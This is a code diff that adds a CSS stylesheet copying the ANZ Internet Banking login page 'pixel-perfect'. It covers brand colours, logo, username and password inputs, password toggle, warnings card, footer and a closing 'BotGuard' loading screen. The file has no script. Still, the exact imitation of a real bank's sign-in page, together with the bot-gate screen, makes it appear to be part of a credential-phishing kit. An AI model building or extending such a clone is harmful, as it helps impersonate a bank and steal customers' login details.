@@ -1,0 +1,617 @@
+/* ============================================
+   ANZ Internet Banking Styles
+   Pixel-perfect from reference design
+   ============================================ */
+
+/* Local Font Face Declarations - Myriad Pro */
+@font-face {
+    font-family: 'myriad-pro';
+    src: url('/fonts/MYRIADPRO-REGULAR.OTF') format('opentype');
+    font-weight: 400;
+    font-style: normal;
+    font-display: swap;
+}
+
+@font-face {
+    font-family: 'myriad-pro';
+    src: url('/fonts/MYRIADPRO-SEMIBOLD.OTF') format('opentype');
+    font-weight: 600;
+    font-style: normal;
+    font-display: swap;
+}
+
+@font-face {
+    font-family: 'myriad-pro';
+    src: url('/fonts/MYRIADPRO-BOLD.OTF') format('opentype');
+    font-weight: 700;
+    font-style: normal;
+    font-display: swap;
+}
+
+@font-face {
+    font-family: 'myriad-pro';
+    src: url('/fonts/MyriadPro-Light.otf') format('opentype');
+    font-weight: 300;
+    font-style: normal;
+    font-display: swap;
+}
+
+/* CSS Custom Properties */
+:root {
+    /* ANZ Colors */
+    --anz-primary-blue: rgb(0, 65, 101);
+    --anz-hover-blue: rgb(0, 147, 216);
+    --anz-focus-blue: rgb(0, 114, 172);
+    --anz-gradient-start: rgb(0, 125, 186);
+    --anz-gradient-end: rgb(46, 86, 128);
+    --anz-white: rgb(255, 255, 255);
+    --anz-input-text: rgb(73, 73, 73);
+    --anz-link-border: rgb(97, 163, 195);
+
+    /* Typography */
+    --font-family: myriad-pro, "Helvetica Neue", Helvetica, Arial, sans-serif;
+
+    /* Spacing */
+    --header-height: 60px;
+    --form-width: 280px;
+    --input-height: 40px;
+    --button-height: 41px;
+    --border-radius: 2px;
+}
+
+/* Reset & Base */
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+html,
+body {
+    height: 100%;
+}
+
+body {
+    font-family: var(--font-family);
+    background: linear-gradient(173deg, var(--anz-gradient-start) 0px, var(--anz-gradient-end) 100%);
+    min-height: 100vh;
+    color: var(--anz-white);
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+    display: flex;
+    flex-direction: column;
+}
+
+#app,
+#__next {
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+
+a {
+    text-decoration: none;
+    color: var(--anz-white);
+}
+
+a:hover {
+    opacity: 0.9;
+}
+
+img {
+    display: block;
+}
+
+/* ============================================
+   Header
+   ============================================ */
+.header {
+    height: var(--header-height);
+    background-color: var(--anz-primary-blue);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 20px;
+    flex-shrink: 0;
+}
+
+.header-container {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 20px;
+}
+
+.logo-link {
+    display: flex;
+    align-items: center;
+    width: 145px;
+    padding-left: 23px;
+}
+
+.logo-link img,
+.logo {
+    width: 100%;
+    height: auto;
+}
+
+.register-btn {
+    background: transparent;
+    border: 1px solid var(--anz-white);
+    border-radius: var(--border-radius);
+    color: var(--anz-white);
+    padding: 7px 20px;
+    font-size: 12px;
+    font-weight: 600;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: background-color 0.2s;
+    font-family: var(--font-family);
+}
+
+.register-btn:hover {
+    background-color: rgba(255, 255, 255, 0.1);
+}
+
+/* ============================================
+   Main Content
+   ============================================ */
+.main {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 20px;
+}
+
+/* Page Title - ANZ Internet Banking */
+.page-title {
+    font-size: 36px;
+    font-weight: 400;
+    line-height: 40px;
+    margin-bottom: 28px;
+    text-align: center;
+    color: var(--anz-white);
+}
+
+/* ============================================
+   Login Form Container
+   ============================================ */
+.login-card {
+    width: var(--form-width);
+    max-width: 100%;
+    background: transparent;
+    padding: 0;
+    box-shadow: none;
+}
+
+.login-form {
+    width: 100%;
+}
+
+.form-group {
+    margin-bottom: 25px;
+    text-align: left;
+}
+
+.form-group:first-of-type {
+    margin-bottom: 25px;
+}
+
+.form-label,
+.form-group label {
+    display: block;
+    font-size: 16px;
+    color: var(--anz-white);
+    margin-bottom: 8px;
+}
+
+.form-input,
+.form-group input[type="text"],
+.form-group input[type="password"] {
+    width: 100%;
+    height: var(--input-height);
+    background-color: var(--anz-white);
+    border: 1px solid var(--anz-white);
+    border-radius: var(--border-radius);
+    padding: 7px 15px 11px;
+    font-size: 16px;
+    color: var(--anz-input-text);
+    font-family: var(--font-family);
+    transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.form-input:focus,
+.form-group input:focus {
+    outline: none;
+    border: 1px solid var(--anz-focus-blue);
+    box-shadow: 0 0 10px 1px var(--anz-white);
+}
+
+.form-input::placeholder,
+.form-group input::placeholder {
+    color: #999;
+}
+
+/* Forgot password link */
+.forgot-link {
+    display: block;
+    font-size: 14px;
+    color: var(--anz-white);
+    text-decoration: none;
+    border-bottom: 1px solid var(--anz-link-border);
+    margin-bottom: 20px;
+    padding-bottom: 2px;
+    float: right;
+    width: fit-content;
+}
+
+.forgot-link:hover {
+    opacity: 0.9;
+}
+
+/* Submit Button */
+.submit-btn,
+.btn-signin {
+    width: 100%;
+    height: var(--button-height);
+    background-color: var(--anz-primary-blue);
+    border: 1px solid var(--anz-white);
+    border-radius: var(--border-radius);
+    color: var(--anz-white);
+    font-size: 15px;
+    font-weight: 400;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 38px;
+    font-family: var(--font-family);
+    transition: background-color 0.2s;
+}
+
+.submit-btn:hover,
+.btn-signin:hover {
+    background-color: var(--anz-hover-blue);
+}
+
+.submit-btn:disabled,
+.btn-signin:disabled {
+    opacity: 0.7;
+    cursor: not-allowed;
+}
+
+.lock-icon {
+    width: 14px;
+    height: 14px;
+    fill: var(--anz-white);
+}
+
+/* ============================================
+   Payment Warnings Card
+   ============================================ */
+.payment-warnings {
+    margin-top: 30px;
+    text-align: center;
+}
+
+.payment-warnings a {
+    display: inline-block;
+    text-decoration: none;
+    transition: opacity 0.2s;
+}
+
+.payment-warnings a:hover {
+    opacity: 0.9;
+}
+
+.payment-warnings img {
+    max-width: 308px;
+    width: 100%;
+    height: auto;
+    display: block;
+    border: 1px solid rgb(255, 255, 255);
+}
+
+/* ============================================
+   Footer
+   ============================================ */
+.footer {
+    background-color: transparent;
+    padding: 20px;
+    text-align: center;
+    flex-shrink: 0;
+}
+
+.footer-container {
+    max-width: 1200px;
+    margin: 0 auto;
+}
+
+.footer-links {
+    list-style: none;
+    display: inline;
+    padding: 0;
+    margin: 0 0 11px 0;
+}
+
+.footer-links li {
+    display: inline;
+    margin-right: 5px;
+}
+
+.footer-links a,
+.footer-link {
+    color: var(--anz-white);
+    text-decoration: none;
+    font-size: 13px;
+    font-weight: 400;
+}
+
+.footer-links a:hover,
+.footer-link:hover {
+    text-decoration: underline;
+}
+
+.copyright {
+    font-size: 12px;
+    font-weight: 400;
+    color: var(--anz-white);
+    margin-bottom: 15px;
+}
+
+/* ============================================
+   Error Message Styling
+   ============================================ */
+.error-message {
+    color: #ffcccc;
+    background-color: rgba(255, 255, 255, 0.1);
+    padding: 12px 16px;
+    border-radius: var(--border-radius);
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 16px;
+}
+
+/* ============================================
+   Card Header for Mobile
+   ============================================ */
+.card-header {
+    display: none;
+    text-align: center;
+    margin-bottom: 24px;
+}
+
+.card-header h2 {
+    font-size: 28px;
+    font-weight: 400;
+    color: var(--anz-white);
+}
+
+/* ============================================
+   Centered Container (for status pages)
+   ============================================ */
+.centered-container {
+    width: var(--form-width);
+    max-width: 100%;
+    margin: 0 auto;
+}
+
+/* ============================================
+   Info panels / Security Card
+   ============================================ */
+.info-panels {
+    display: none;
+    /* Hidden on ANZ - simple single column design */
+}
+
+.security-card,
+.info-card {
+    background-color: rgba(255, 255, 255, 0.1);
+    border-radius: var(--border-radius);
+    padding: 20px;
+    margin-top: 24px;
+}
+
+.security-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 12px;
+}
+
+.security-header h2 {
+    font-size: 16px;
+    font-weight: 600;
+    color: var(--anz-white);
+}
+
+.security-text {
+    font-size: 14px;
+    color: var(--anz-white);
+    opacity: 0.9;
+    line-height: 1.5;
+}
+
+/* ============================================
+   Password wrapper
+   ============================================ */
+.password-wrapper {
+    position: relative;
+    display: flex;
+    align-items: center;
+}
+
+.password-wrapper input {
+    width: 100%;
+    padding-right: 60px;
+}
+
+.password-toggle {
+    position: absolute;
+    right: 12px;
+    background: none;
+    border: none;
+    cursor: pointer;
+    padding: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--anz-primary-blue);
+    font-size: 13px;
+    font-weight: 500;
+    font-family: var(--font-family);
+}
+
+.password-toggle:hover {
+    text-decoration: underline;
+}
+
+/* ============================================
+   Checkbox Group
+   ============================================ */
+.checkbox-group {
+    flex-direction: row;
+    align-items: center;
+    gap: 8px;
+    display: flex;
+    margin-bottom: 20px;
+}
+
+.checkbox-group input[type="checkbox"] {
+    width: 18px;
+    height: 18px;
+    accent-color: var(--anz-primary-blue);
+    cursor: pointer;
+}
+
+.checkbox-group label {
+    cursor: pointer;
+    font-weight: 400;
+    font-size: 14px;
+    color: var(--anz-white);
+}
+
+/* ============================================
+   Responsive Design
+   ============================================ */
+@media (max-width: 768px) {
+    .header {
+        padding: 0 15px;
+    }
+
+    .header-container {
+        padding: 0 15px;
+    }
+
+    .logo-link {
+        width: 120px;
+        padding-left: 10px;
+    }
+
+    .register-btn {
+        font-size: 11px;
+        padding: 6px 15px;
+    }
+
+    .main {
+        padding: 30px 15px;
+    }
+
+    .page-title {
+        font-size: 28px;
+        line-height: 32px;
+        margin-bottom: 24px;
+    }
+
+    .payment-warnings {
+        margin-top: 20px;
+    }
+
+    .payment-warnings img {
+        max-width: 100%;
+    }
+
+    /* Show card header on mobile */
+    .card-header {
+        display: block;
+    }
+}
+
+@media (max-width: 479px) {
+
+    /* Mobile footer layout - vertical stacking */
+    .footer-links {
+        display: inline-block;
+        max-width: 250px;
+        margin: 0 0 11px 0;
+    }
+
+    .footer-links li {
+        display: block;
+        margin-right: 0;
+    }
+
+    .footer-links a {
+        display: block;
+        width: 100%;
+        padding: 5px 20px;
+    }
+
+    .copyright {
+        font-size: 11px;
+    }
+}
+
+@media (min-width: 769px) and (max-width: 1024px) {
+    .main {
+        padding: 35px 25px;
+    }
+
+    .page-title {
+        font-size: 32px;
+        line-height: 36px;
+    }
+}
+
+/* ============================================
+   BotGuard Loading State
+   ============================================ */
+.botguard-loading {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 60vh;
+    background: transparent;
+}
+
+.botguard-spinner {
+    width: 48px;
+    height: 48px;
+    border: 3px solid rgba(255, 255, 255, 0.3);
+    border-top-color: var(--anz-white);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+.botguard-text {
+    margin-top: 16px;
+    color: var(--anz-white);
+    font-size: 14px;
+    opacity: 0.9;
+}
